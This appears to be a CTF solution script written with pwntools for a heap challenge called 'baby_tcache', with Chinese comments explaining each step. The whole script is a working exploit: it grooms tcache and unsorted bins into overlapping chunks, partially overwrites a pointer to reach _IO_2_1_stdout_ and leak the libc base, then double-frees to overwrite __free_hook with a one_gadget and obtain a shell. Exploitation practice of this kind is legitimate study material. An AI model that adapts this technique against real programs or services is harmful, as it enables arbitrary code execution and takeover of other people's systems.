from pwn import *

#context.log_level = 'debug'
p = process("./baby_tcache")
elf = ELF("./libc.so.6")

def new(size,data):
    p.recvuntil('Your choice: ')
    p.sendline('1')
    p.recvuntil('Size:')
    p.sendline(str(size))
    p.recvuntil('Data:')
    p.send(data)

def delete(idx):
    p.recvuntil('Your choice: ')
    p.sendline('2')
    p.recvuntil('Index:')
    p.sendline(str(idx))

def new_7(size):
    for i in range(0,7):
        new(size,'a'*0x10)

def del_7(start,end):
    for i in range(start,end):
        delete(i)
    
def main():

    new_7(0x80)
    del_7(0,7)
    
    new_7(0x120)
    del_7(0,7)

    new_7(0x200)  #这里申请0x200的chunk，要是申请0x100，之后再new（0x108）时会覆盖presize，导致报错
    
    new(0x208,'A'*0x10) #7 chunk A
    new(0x200,'B'*0x10) #8 chunk B
    new(0x200,'C'*0x10) #9 chunk C

    del_7(0,7)

    delete(8) #释放chunk B和chunk A 获得一个unsorted bin
    delete(7)

    new(0x108,'b'*0x108) #0  申请后，剩下unsorted bin，并覆盖size，0x311->0x300，作为chunk B

    new_7(0x80) # 1-7
    new(0x80,'b1'*0x5) #8 将chunk B 分出一块chunk b1
    del_7(1,8)

    new(0x210,'b2'*0x5) #1 将chunk B 分出一块chunk b2，剩下0x50，如果分的太小，之后再申请chunk 8时，就会在剩下的unsorted bin 中申请
    #而不会重新申请到chunk b1

    delete(8) # 释放chunk b1
    delete(9) # 释放chunk C，进行overlapping，现在top chunk 和chunk b1重合
    
    delete(1) # 将chunk b2 放入 tcache

    new_7(0x80) # 1-7
    new(0x80,'a'*0x10) #8 重新申请到chunk b1，此时top chunk 和chunk b2重合
    del_7(1,8)

    new_7(0x120) #1-7
    new(0x120,'a'*0x10) #9 从top中重新申请到chunk b2
    del_7(1,8)
    new(0x600,'a'*0x10) #1 防止释放chunk b2后和top chunk 合并

    delete(9) #释放chunk b2，使chunk b2变成unsorted bin，在fd和bk填充main_arena地址
    #此时tcache中有一块0x220大小的chunk b2，unsorted bin中也有一块
  
    new(0x50,'\x60\xb7')#2 申请unsorted bin中那一块，部分覆盖地址到_IO_2_1_stdout_处
    new(0x210,'a'*0x10) #3 申请tcache中chunk b2，下一块就是_IO_2_1_stdout_

    payload = p64(0xfbad3c80)+p64(0)*3+"\x08"

    new(0x210,payload) #4 修改f->_IO_write_base地址进行任意读，进行信息泄露，'\x08'覆盖地址最后一个字节，输出那一块地址的内容

    libc_base = u64(p.recv(6).ljust(8,'\0'))-0x3ed8b0
    print hex(libc_base)

#-----double free 
    free_hook = libc_base + elf.symbols['__free_hook']
    one_gadget = 0x4f322
    one_gadget = libc_base + one_gadget
    
    delete(3) #chunk 2和3都是chunk b2
    delete(2)

    new(0x50,p64(free_hook)) #2 覆盖free_hook为one_gadget

    new(0x50,'a'*0x10) #3

    new(0x50,p64(one_gadget)) #4

    delete(0)

if __name__=='__main__':

    while(True):
        try:
            main()
            p.interactive()
            p.close()
            break
        except:
            p.close()
            p = process('./baby_tcache')
    
